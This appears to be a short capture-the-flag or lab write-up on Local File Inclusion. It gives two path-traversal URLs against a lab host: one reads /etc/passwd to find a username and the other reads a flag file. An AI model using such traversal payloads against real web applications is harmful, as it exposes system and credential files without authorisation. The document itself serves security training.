# [Local File Inclusion (LFI)](Local%20File%20Inclusion%20(LFI).md)
### Using the file inclusion find the name of a user on the system that starts with "b".

```http
http://154.57.164.75:32114/index.php?language=../../../../etc/passwd
```
![](Screenshot%202026-06-29%20at%2014.34.14.png)
### Submit the contents of the flag.txt file located in the /usr/share/flags directory.

```http
http://154.57.164.75:32114/index.php?language=../../../../usr/share/flags/flag.txt
```
![](Screenshot%202026-06-29%20at%2014.36.56.png)
